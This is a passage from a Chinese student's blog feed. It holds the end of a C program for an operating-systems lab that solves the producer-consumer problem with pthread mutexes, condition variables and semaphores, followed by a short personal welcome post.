"</span>,q-&gt;production[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = q-&gt;front; i &lt; BUFFERNUM; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>,q-&gt;production[i]);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= q-&gt;rear; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>,q-&gt;production[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n当前执行的进程：生产者1\n"</span>);   <span class="comment">//打印当前执行的进程</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"产生的数据：%c\n"</span>,c);      <span class="comment">//打印产生或消费的数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">sem_post(&amp;full_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (q-&gt;num == <span class="number">1</span>) &#123;</span><br><span class="line">pthread_cond_signal(&amp;empty);    </span><br><span class="line">&#125;</span><br><span class="line">pthread_mutex_unlock(&amp;lock); </span><br><span class="line"></span><br><span class="line">sleep(rand() % <span class="number">2</span>);            </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生产者2</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">producer2</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Buffer_Queue</span> *<span class="title">q</span>;</span></span><br><span class="line">q = (struct Buffer_Queue *) arg;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pthread_mutex_lock(&amp;lock);       </span><br><span class="line"><span class="keyword">while</span> (q-&gt;num == BUFFERNUM)    <span class="comment">//缓冲区已经满了，等待</span></span><br><span class="line">&#123;            </span><br><span class="line">pthread_cond_wait(&amp;full, &amp;lock);</span><br><span class="line">&#125;</span><br><span class="line">sem_wait(&amp;empty_sem);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*生产产品*/</span></span><br><span class="line"><span class="keyword">char</span> c = getRandChar();                                      <span class="comment">//随机获取字母</span></span><br><span class="line">q-&gt;rear = (q-&gt;rear + <span class="number">1</span>) % BUFFERNUM;                         <span class="comment">//计算新的尾指针   </span></span><br><span class="line">q-&gt;production[q-&gt;rear] = c;                                  <span class="comment">//写入新产品  </span></span><br><span class="line">q-&gt;num++;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*打印输出结果*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line">printTime();              <span class="comment">//程序运行时间</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"缓冲区数据（%d个）："</span>,q-&gt;num);                   <span class="comment">//打印缓冲区中的数据</span></span><br><span class="line"><span class="keyword">if</span>(q-&gt;front &lt; q-&gt;rear)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = q-&gt;front; i &lt;= q-&gt;rear; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>,q-&gt;production[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = q-&gt;front; i &lt; BUFFERNUM; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>,q-&gt;production[i]);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= q-&gt;rear; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>,q-&gt;production[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n当前执行的进程：生产者2\n"</span>);   <span class="comment">//打印当前执行的进程</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"产生的数据：%c\n"</span>,c);      <span class="comment">//打印产生或消费的数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">sem_post(&amp;full_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (q-&gt;num == <span class="number">1</span>) &#123;</span><br><span class="line">pthread_cond_signal(&amp;empty);    </span><br><span class="line">&#125;</span><br><span class="line">pthread_mutex_unlock(&amp;lock); </span><br><span class="line"></span><br><span class="line">sleep(rand() % <span class="number">2</span>);            </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费者1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">consumer1</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Buffer_Queue</span> *<span class="title">q</span>;</span></span><br><span class="line">q = (struct Buffer_Queue *) arg;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pthread_mutex_lock(&amp;lock);        </span><br><span class="line"><span class="keyword">while</span> (q-&gt;num == <span class="number">0</span>)           <span class="comment">//缓冲区已经空了，等待</span></span><br><span class="line">&#123;        </span><br><span class="line">pthread_cond_wait(&amp;empty, &amp;lock);</span><br><span class="line">&#125;</span><br><span class="line">sem_wait(&amp;full_sem);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*消费产品*/</span></span><br><span class="line">q-&gt;front = (q-&gt;front + <span class="number">1</span>) % BUFFERNUM;    <span class="comment">//计算新的头指针</span></span><br><span class="line"><span class="keyword">char</span> c = q-&gt;production[q-&gt;front];         <span class="comment">//消费产品</span></span><br><span class="line">q-&gt;production[q-&gt;front] = <span class="string">' '</span>;            <span class="comment">//</span></span><br><span class="line">q-&gt;num--;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*打印输出结果*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line">printTime();              <span class="comment">//程序运行时间</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"缓冲区数据（%d个）："</span>,q-&gt;num);                   <span class="comment">//打印缓冲区中的数据</span></span><br><span class="line"><span class="keyword">if</span>(q-&gt;front &lt; q-&gt;rear)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = q-&gt;front; i &lt;= q-&gt;rear; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>,q-&gt;production[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = q-&gt;front; i &lt; BUFFERNUM; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>,q-&gt;production[i]);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= q-&gt;rear; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>,q-&gt;production[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n当前执行的进程：消费者1\n"</span>);   <span class="comment">//打印当前执行的进程</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"消耗的数据：%c\n"</span>,c);      <span class="comment">//打印产生或消费的数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sem_post(&amp;empty_sem);</span><br><span class="line"><span class="keyword">if</span> (q-&gt;num == BUFFERNUM - <span class="number">1</span>) &#123;</span><br><span class="line">pthread_cond_signal(&amp;full);</span><br><span class="line">&#125;</span><br><span class="line">pthread_mutex_unlock(&amp;lock);</span><br><span class="line">sleep(rand() % <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费者2</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">consumer2</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Buffer_Queue</span> *<span class="title">q</span>;</span></span><br><span class="line">q = (struct Buffer_Queue *) arg;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pthread_mutex_lock(&amp;lock);        </span><br><span class="line"><span class="keyword">while</span> (q-&gt;num == <span class="number">0</span>)           <span class="comment">//缓冲区已经空了，等待</span></span><br><span class="line">&#123;        </span><br><span class="line">pthread_cond_wait(&amp;empty, &amp;lock);</span><br><span class="line">&#125;</span><br><span class="line">sem_wait(&amp;full_sem);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*消费产品*/</span></span><br><span class="line">q-&gt;front = (q-&gt;front + <span class="number">1</span>) % BUFFERNUM;    <span class="comment">//计算新的头指针</span></span><br><span class="line"><span class="keyword">char</span> c = q-&gt;production[q-&gt;front];         <span class="comment">//消费产品</span></span><br><span class="line">q-&gt;production[q-&gt;front] = <span class="string">' '</span>;            <span class="comment">//</span></span><br><span class="line">q-&gt;num--;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*打印输出结果*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line">printTime();              <span class="comment">//程序运行时间</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"缓冲区数据（%d个）："</span>,q-&gt;num);                   <span class="comment">//打印缓冲区中的数据</span></span><br><span class="line"><span class="keyword">if</span>(q-&gt;front &lt; q-&gt;rear)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = q-&gt;front; i &lt;= q-&gt;rear; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>,q-&gt;production[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = q-&gt;front; i &lt; BUFFERNUM; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>,q-&gt;production[i]);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= q-&gt;rear; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>,q-&gt;production[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n当前执行的进程：消费者1\n"</span>);   <span class="comment">//打印当前执行的进程</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"消耗的数据：%c\n"</span>,c);      <span class="comment">//打印产生或消费的数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sem_post(&amp;empty_sem);</span><br><span class="line"><span class="keyword">if</span> (q-&gt;num == BUFFERNUM - <span class="number">1</span>) &#123;</span><br><span class="line">pthread_cond_signal(&amp;full);</span><br><span class="line">&#125;</span><br><span class="line">pthread_mutex_unlock(&amp;lock);</span><br><span class="line">sleep(rand() % <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//输出设计者</span></span><br><span class="line">printDesign();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*创建缓冲区*/</span></span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Buffer_Queue</span> *<span class="title">q</span>;</span></span><br><span class="line">q = (struct Buffer_Queue *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct Buffer_Queue));</span><br><span class="line"><span class="comment">//初始化队列</span></span><br><span class="line">q-&gt;front = q-&gt;rear = BUFFERNUM - <span class="number">1</span>;</span><br><span class="line">q-&gt;num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*执行进程*/</span></span><br><span class="line"><span class="comment">//定义四个线程</span></span><br><span class="line"><span class="keyword">pthread_t</span> pid1, cid1, pid2, cid2;</span><br><span class="line"><span class="comment">//初始化信号量</span></span><br><span class="line">sem_init(&amp;empty_sem, <span class="number">0</span>, BUFFERNUM);   </span><br><span class="line">sem_init(&amp;full_sem, <span class="number">0</span>, <span class="number">0</span>);   </span><br><span class="line"><span class="comment">//创建线程</span></span><br><span class="line">pthread_create(&amp;pid1, <span class="literal">NULL</span>, producer1, (<span class="keyword">void</span> *) q);</span><br><span class="line">pthread_create(&amp;cid1, <span class="literal">NULL</span>, consumer1, (<span class="keyword">void</span> *) q);</span><br><span class="line">pthread_create(&amp;pid2, <span class="literal">NULL</span>, producer2, (<span class="keyword">void</span> *) q);</span><br><span class="line">pthread_create(&amp;cid2, <span class="literal">NULL</span>, consumer2, (<span class="keyword">void</span> *) q);</span><br><span class="line"><span class="comment">//销毁线程</span></span><br><span class="line">pthread_join(pid1, <span class="literal">NULL</span>);</span><br><span class="line">pthread_join(cid1, <span class="literal">NULL</span>);</span><br><span class="line">pthread_join(pid2, <span class="literal">NULL</span>);</span><br><span class="line">pthread_join(cid2, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//销毁信号量</span></span><br><span class="line">sem_destroy(&amp;empty_sem);</span><br><span class="line">sem_destroy(&amp;full_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;一、引言&quot;&gt;&lt;a href=&quot;#一、引言&quot; class=&quot;headerlink&quot; title=&quot;一、引言&quot;&gt;&lt;/a&gt;一、引言&lt;/h3&gt;&lt;p&gt;此问题是操作系统中的一个经典的同步异步问题，是我们操作系统课程中非常重要的一部分。实验要求我们用C语言在Linux操作系统下利用信号量函数和共享内存函数实现经典的生产者消费者问题。也借此把所学知识记录下来。实验要求如下：&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Welcome to my website</title>
    <link href="http://yoursite.com/2018/01/19/hello-world/"/>
    <id>http://yoursite.com/2018/01/19/hello-world/</id>
    <published>2018-01-19T14:09:33.000Z</published>
    <updated>2018-02-21T02:42:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>欢迎来到Abigale的博客。</p><a id="more"></a><p>一名来自山东的计算机科班学生，专业信息安全</p><p>科班来自湖南大学</p><p>记录生活，学习技术</p><p>Abigale：最初的快乐</p><p>我爱我的父母，爱我的家人，爱我的学校，爱我的家乡</p><p>我爱中国！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;欢迎来到Abigale的博客。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
